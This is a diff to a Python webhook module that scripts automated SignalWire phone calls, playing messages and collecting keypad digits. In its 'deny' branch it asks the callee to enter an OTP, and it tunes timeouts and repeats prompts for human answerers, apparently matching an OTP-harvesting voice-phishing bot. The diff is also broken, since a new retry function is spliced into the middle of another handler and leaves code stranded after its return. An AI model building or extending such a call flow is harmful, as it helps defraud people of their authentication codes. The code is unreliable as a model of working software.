@@ -62,7 +62,77 @@ async def signalwire_webhook(call_id: str, request: Request):
         backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
         first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
         
+        # Check if human/silent human detected
+        AnsweredBy = form_data.get('AnsweredBy', '').lower()
+        
+        # Log message played event
+        msg_event = {
+            'time': datetime.utcnow().isoformat(),
+            'event': 'message_played',
+            'message': '🔊 Step 1 message played',
+            'data': {'step': 1, 'attempt': 1}
+        }
+        await MongoDBService.update_call_events(call_id, msg_event)
+        
+        # For human/unknown - use longer timeout and allow retry
+        retry_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/retry-step1"
+        
+
+@router.post("/signalwire/{call_id}/retry-step1")
+async def signalwire_retry_step1(call_id: str):
+    """Retry Step 1 if no input received (only for human/silent human)"""
+    try:
+        call_data = await MongoDBService.get_call(call_id)
+        if not call_data:
+            return Response(
+                content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
+                media_type="application/xml"
+            )
+        
+        voice = call_data.get('tts_voice', 'Aurora')
+        step_1_message = call_data.get('step_1_message', 'Hello')
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        first_input_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/first-input"
+        
+        # Log retry
+        msg_event = {
+            'time': datetime.utcnow().isoformat(),
+            'event': 'message_played',
+            'message': '🔊 Step 1 message played (retry)',
+            'data': {'step': 1, 'attempt': 2}
+        }
+        await MongoDBService.update_call_events(call_id, msg_event)
+        
+        # Second attempt - then give up
         twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="15">
+        <Say voice="{voice}">{step_1_message}</Say>
+    </Gather>
+    <Say voice="{voice}">We did not receive any input. Goodbye.</Say>
+    <Hangup/>
+</Response>"""
+        return Response(content=twiml, media_type="application/xml")
+        
+    except Exception as e:
+        logger.error(f"Retry error: {e}")
+        return Response(
+            content='<?xml version="1.0" encoding="UTF-8"?><Response><Hangup/></Response>',
+            media_type="application/xml"
+        )
+
+        if AnsweredBy in ['human', 'unknown', '']:
+            # Human detected - longer timeout (15 seconds)
+            twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<Response>
+    <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="15">
+        <Say voice="{voice}">{step_1_message}</Say>
+    </Gather>
+    <Redirect>{retry_url}</Redirect>
+</Response>"""
+        else:
+            # Machine detected - shorter timeout
+            twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
 <Response>
     <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="10">
         <Say voice="{voice}">{step_1_message}</Say>
@@ -193,6 +263,15 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             step_3_message = call_data.get('step_3_message', 'Please wait')
             wait_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/wait"
             
+            # Log message played
+            msg_event = {
+                'time': datetime.utcnow().isoformat(),
+                'event': 'message_played',
+                'message': '🔊 Step 3 message played',
+                'data': {'step': 3}
+            }
+            await MongoDBService.update_call_events(call_id, msg_event)
+            
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
     <Say voice="{voice}">{step_3_message}</Say>
@@ -204,9 +283,21 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             # First time - Ask for OTP using Step 2 message (EXACT text from UI)
             gather_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/deny"
             
+            # Log message played
+            msg_event = {
+                'time': datetime.utcnow().isoformat(),
+                'event': 'message_played',
+                'message': '🔊 Step 2 message played',
+                'data': {'step': 2}
+            }
+            await MongoDBService.update_call_events(call_id, msg_event)
+            
+            # Repeat 2x for human detection
             twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="15">
+    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="20">
+        <Say voice="{voice}">{step_2_message}</Say>
+        <Pause length="2"/>
         <Say voice="{voice}">{step_2_message}</Say>
     </Gather>
     <Say voice="{voice}">We did not receive the code. Goodbye.</Say>
